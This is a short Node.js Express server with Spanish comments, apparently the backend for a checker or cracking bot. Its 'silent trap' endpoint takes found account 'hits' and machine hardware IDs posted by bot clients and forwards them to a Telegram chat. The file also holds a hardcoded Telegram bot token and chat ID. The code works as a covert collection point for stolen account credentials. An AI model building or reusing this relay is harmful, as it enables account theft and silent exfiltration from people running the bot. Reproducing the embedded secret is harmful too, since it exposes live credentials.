const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Permite leer los datos JSON enviados por el bot
app.use(express.json());

const TELEGRAM_TOKEN = '8753363173:AAETIidwUu0M1hPYXOGPswuvBclTsRnVZ6g';
const MI_CHAT_ID = '7503721625';

async function enviarTelegram(mensaje) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: MI_CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
        });
        console.log("✅ Mensaje reenviado a Telegram");
    } catch (e) {
        console.log("❌ Error en Telegram API:", e.response ? e.response.data : e.message);
    }
}

// Ruta para licencias
app.get('/lista_blanca.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'lista_blanca.txt'));
});

// Ruta de la trampa silenciosa
app.post('/api/v1/sync', async (req, res) => {
    console.log("📥 Recibido del bot:", req.body);
    const { tipo, hwid, data, fecha } = req.body;

    let mensajeTelegram = "";
    if (tipo === "HIT_ENCONTRADO") {
        mensajeTelegram = `🔥 *¡NUEVO HIT DETECTADO!* 🔥\n\n👤 *Cuenta:* \`${data}\`\n🆔 *PC:* ${hwid}\n📅 *Fecha:* ${fecha}`;
    } else {
        mensajeTelegram = `⚠️ *AVISO SISTEMA:* ${tipo}\n🆔 *HWID:* ${hwid}\n📝 *Info:* ${data}`;
    }

    await enviarTelegram(mensajeTelegram);
    res.status(200).send("OK");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log("🚀 Servidor Maestro Titán Online conectado a Telegram");
});
